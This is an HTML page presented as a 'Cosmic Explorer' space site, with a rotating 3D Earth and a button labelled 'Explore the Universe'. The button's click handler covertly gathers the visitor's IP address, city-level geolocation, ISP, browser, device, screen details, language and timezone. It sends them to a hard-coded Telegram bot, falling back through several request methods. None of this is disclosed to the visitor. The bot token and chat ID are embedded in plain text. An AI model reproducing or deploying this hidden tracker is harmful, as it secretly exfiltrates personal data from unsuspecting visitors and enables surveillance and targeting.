<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cosmic Explorer</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <style>
        body {
            overflow: hidden;
            background: #000000;
        }
        
        #planet-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 70vh;
            z-index: 1;
        }
        
        .content {
            position: relative;
            z-index: 2;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
        }
        
        .explore-btn {
            position: absolute;
            bottom: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(100, 149, 237, 0.5);
            z-index: 3;
        }
        
        .explore-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 25px rgba(100, 149, 237, 0.8);
        }
        
        .stars {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        
        .star {
            position: absolute;
            background-color: white;
            border-radius: 50%;
            animation: twinkle var(--duration) infinite ease-in-out;
        }
        
        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="planet-container"></div>
    <div class="stars" id="stars"></div>
    
    <div class="content">
        <button class="explore-btn bg-blue-500 hover:bg-blue-600 text-white font-bold py-4 px-8 rounded-full text-lg">
            EXPLORE THE UNIVERSE
        </button>
    </div>

    <script>
        function createStars() {
            const starsContainer = document.getElementById('stars');
            const starsCount = 200;
            
            for (let i = 0; i < starsCount; i++) {
                const star = document.createElement('div');
                star.classList.add('star');
                
                const size = Math.random() * 3;
                const posX = Math.random() * 100;
                const posY = Math.random() * 100;
                const duration = 2 + Math.random() * 5;
                
                star.style.width = `${size}px`;
                star.style.height = `${size}px`;
                star.style.left = `${posX}%`;
                star.style.top = `${posY}%`;
                star.style.setProperty('--duration', `${duration}s`);
                
                starsContainer.appendChild(star);
            }
        }
        
        function initPlanet() {
            const container = document.getElementById('planet-container');
            const width = container.clientWidth;
            const height = container.clientHeight;
            
            const scene = new THREE.Scene();
            const camera = new THREE.PerspectiveCamera(75, width / height, 0.1, 1000);
            camera.position.z = 5;
            
            const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
            renderer.setSize(width, height);
            container.appendChild(renderer.domElement);
            
            // Використовуємо fallback текстури якщо основні не завантажуються
            const textureLoader = new THREE.TextureLoader();
            const geometry = new THREE.SphereGeometry(1.5, 64, 64);
            
            // Створюємо базовий матеріал з кольором
            const material = new THREE.MeshPhongMaterial({
                color: 0x4477aa,
                shininess: 5
            });
            
            // Намагаємося завантажити текстури з fallback
            textureLoader.load(
                'https://threejs.org/examples/textures/planets/earth_atmos_2048.jpg',
                (texture) => {
                    material.map = texture;
                    material.needsUpdate = true;
                },
                undefined,
                () => console.log('Earth texture failed to load, using fallback color')
            );
            
            const earth = new THREE.Mesh(geometry, material);
            scene.add(earth);
            
            const cloudGeometry = new THREE.SphereGeometry(1.52, 64, 64);
            const cloudMaterial = new THREE.MeshPhongMaterial({
                color: 0xffffff,
                transparent: true,
                opacity: 0.2
            });
            
            textureLoader.load(
                'https://threejs.org/examples/textures/planets/earth_clouds_1024.png',
                (texture) => {
                    cloudMaterial.map = texture;
                    cloudMaterial.needsUpdate = true;
                },
                undefined,
                () => console.log('Cloud texture failed to load, using fallback')
            );
            
            const clouds = new THREE.Mesh(cloudGeometry, cloudMaterial);
            scene.add(clouds);
            
            const ambientLight = new THREE.AmbientLight(0x333333);
            scene.add(ambientLight);
            
            const directionalLight = new THREE.DirectionalLight(0xffffff, 1);
            directionalLight.position.set(5, 3, 5);
            scene.add(directionalLight);
            
            function animate() {
                requestAnimationFrame(animate);
                earth.rotation.y += 0.001;
                clouds.rotation.y += 0.0015;
                renderer.render(scene, camera);
            }
            
            window.addEventListener('resize', () => {
                const width = container.clientWidth;
                const height = container.clientHeight;
                camera.aspect = width / height;
                camera.updateProjectionMatrix();
                renderer.setSize(width, height);
            });
            
            animate();
        }
        
        // JSONP функція для обходу CORS
        function fetchJSONP(url, timeout = 5000) {
            return new Promise((resolve, reject) => {
                const callbackName = 'jsonp_callback_' + Math.round(100000 * Math.random());
                const script = document.createElement('script');
                const timer = setTimeout(() => {
                    cleanup();
                    reject(new Error('JSONP timeout'));
                }, timeout);
                
                function cleanup() {
                    clearTimeout(timer);
                    script.remove();
                    delete window[callbackName];
                }
                
                window[callbackName] = (data) => {
                    cleanup();
                    resolve(data);
                };
                
                script.src = url + (url.includes('?') ? '&' : '?') + 'callback=' + callbackName;
                document.head.appendChild(script);
            });
        }

        // Функція відправки в Telegram з кількома методами
        async function sendToTelegram(message) {
            const TOKEN = '8233087787:AAEbK8e6n6fhQ1VQvYL8M5W5GEGYwAwyL8c';
            const CHAT_ID = '1939982276';
            
            // Спочатку пробуємо POST JSON
            try {
                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                if (response.ok) {
                    return await response.json();
                }
                throw new Error('POST failed');
            } catch (e) {
                console.log('POST method failed, trying GET...');
                
                // Fallback на GET запит
                try {
                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
                    const response = await fetch(url, { mode: 'no-cors' });
                    console.log('GET method completed');
                    return true;
                } catch (e2) {
                    console.log('GET method also failed, trying FormData...');
                    
                    // Останній fallback - FormData
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('text', message);
                    
                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors'
                    });
                    console.log('FormData method completed');
                    return true;
                }
            }
        }
        
        window.addEventListener('load', () => {
            createStars();
            initPlanet();
            
            const btn = document.querySelector('.explore-btn');
            btn.addEventListener('click', async () => {
                btn.textContent = 'WARP DRIVE ACTIVATED';
                btn.classList.remove('bg-blue-500', 'hover:bg-blue-600');
                btn.classList.add('bg-purple-600', 'hover:bg-purple-700');
                
                try {
                    console.log('Button clicked, fetching data...');
                    
                    // Отримуємо IP та геолокацію одним запитом через API що підтримує CORS
                    let ip = 'невідомо';
                    let country = 'невідомо';
                    let region = 'невідомо';
                    let city = 'невідомо';
                    let isp = 'невідомо';
                    
                    try {
                        // Спочатку пробуємо отримати все в одному запиті
                        try {
                            console.log('Trying ipapi.com (no IP required)...');
                            const response = await fetch('https://ipapi.co/json/');
                            const data = await response.json();
                            if (data.ip) {
                                ip = data.ip;
                                country = data.country_name || 'невідомо';
                                region = data.region || 'невідомо';
                                city = data.city || 'невідомо';
                                isp = data.org || 'невідомо';
                                console.log('Got all data from ipapi.co:', data);
                            } else {
                                throw new Error('No IP in response');
                            }
                        } catch (e) {
                            console.log('ipapi.co failed, trying ip-api.com...');
                            try {
                                const response = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,org,query');
                                const data = await response.json();
                                if (data.status === 'success') {
                                    ip = data.query;
                                    country = data.country || 'невідомо';
                                    region = data.regionName || 'невідомо';
                                    city = data.city || 'невідомо';
                                    isp = data.isp || data.org || 'невідомо';
                                    console.log('Got all data from ip-api.com:', data);
                                } else {
                                    throw new Error('ip-api failed');
                                }
                            } catch (e2) {
                                console.log('ip-api.com failed, trying separate IP then geo...');
                                try {
                                    // Окремо IP
                                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                                    const ipData = await ipResponse.json();
                                    ip = ipData.ip;
                                    console.log('IP fetched separately:', ip);
                                    
                                    // Тепер геолокацію через JSONP
                                    try {
                                        const geoData = await fetchJSONP(`http://ip-api.com/json/${ip}`);
                                        if (geoData.status === 'success') {
                                            country = geoData.country || 'невідомо';
                                            region = geoData.regionName || 'невідомо';
                                            city = geoData.city || 'невідомо';
                                            isp = geoData.isp || geoData.org || 'невідомо';
                                            console.log('Geo data from JSONP:', geoData);
                                        }
                                    } catch (e3) {
                                        console.log('JSONP geo failed, trying httpbin...');
                                        try {
                                            const httpbinResponse = await fetch('https://httpbin.org/ip');
                                            const httpbinData = await httpbinResponse.json();
                                            if (httpbinData.origin) {
                                                ip = httpbinData.origin.split(',')[0].trim();
                                                console.log('IP from httpbin:', ip);
                                            }
                                        } catch (e4) {
                                            console.log('All methods failed');
                                        }
                                    }
                                } catch (e3) {
                                    console.log('Even separate IP failed');
                                }
                            }
                        }
                    } catch (e) {
                        console.log('Complete IP detection failed');
                    }

                    // Роздільна здатність екрана
                    const screenWidth = window.screen.width;
                    const screenHeight = window.screen.height;

                    // Мова браузера
                    const language = navigator.language || 'невідомо';

                    // Часовий пояс
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'невідомо';

                    // Тип пристрою (на основі User Agent)
                    const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Мобільний' : 'Настільний/Планшет';

                    // Швидкість інтернету (приблизно)
                    const startTime = performance.now();
                    try {
                        await fetch('https://api.ipify.org?format=json'); // Тестовий запит
                    } catch (e) {
                        // Ігноруємо помилки тестового запиту
                    }
                    const endTime = performance.now();
                    const latency = Math.round(endTime - startTime);
                    const connectionSpeed = latency < 100 ? 'Швидкий' : latency < 300 ? 'Середній' : 'Повільний';

                    // Додаткова інформація: версія браузера та платформа
                    const browser = navigator.userAgent.match(/(firefox|chrome|safari|opera|edge)\/([\d.]+)/i) || ['невідомо', 'невідомо'];
                    const browserName = browser[1] || 'невідомо';
                    const browserVersion = browser[2] || 'невідомо';
                    const platform = navigator.platform || 'невідомо';

                    // Додаткова інформація: розмір вікна браузера
                    const windowWidth = window.innerWidth;
                    const windowHeight = window.innerHeight;

                    const userAgent = navigator.userAgent;
                    const timestamp = new Date().toLocaleString('uk-UA');
                    console.log('User Agent:', userAgent, 'Time:', timestamp);
                    console.log('Geo Data:', { country, region, city, isp });
                    console.log('Screen:', { screenWidth, screenHeight });
                    console.log('Window:', { windowWidth, windowHeight });
                    console.log('Browser:', { browserName, browserVersion });
                    console.log('Language:', language, 'Timezone:', timezone);
                    console.log('Device:', isMobile, 'Speed:', connectionSpeed);
                    console.log('Platform:', platform);

                    const message = `Новий клік!\nIP: ${ip}\nКраїна: ${country}\nОбласть: ${region}\nМісто: ${city}\nПровайдер: ${isp}\nUser Agent: ${userAgent}\nМова: ${language}\nЧасовий пояс: ${timezone}\nТип пристрою: ${isMobile}\nШвидкість: ${connectionSpeed}\nРоздільна здатність екрана: ${screenWidth}x${screenHeight}\nРозмір вікна: ${windowWidth}x${windowHeight}\nБраузер: ${browserName} ${browserVersion}\nПлатформа: ${platform}\nЧас: ${timestamp}`;
                    console.log('Message to send:', message);

                    await sendToTelegram(message);
                    
                    console.log('Message sent successfully!');

                    setTimeout(() => {
                        btn.innerHTML = '<span class="animate-pulse">ENGAGING...</span>';
                    }, 1000);
                } catch (error) {
                    console.error('Помилка:', error);
                    btn.innerHTML = '<span class="text-red-300">❌ ERROR</span>';
                    btn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
                    btn.classList.add('bg-red-600', 'hover:bg-red-700');
                    
                    setTimeout(() => {
                        btn.innerHTML = 'TRY AGAIN';
                        btn.classList.remove('bg-red-600', 'hover:bg-red-700');
                        btn.classList.add('bg-blue-500', 'hover:bg-blue-600');
                    }, 3000);
                }
            });
        });
    </script>
</body>
</html>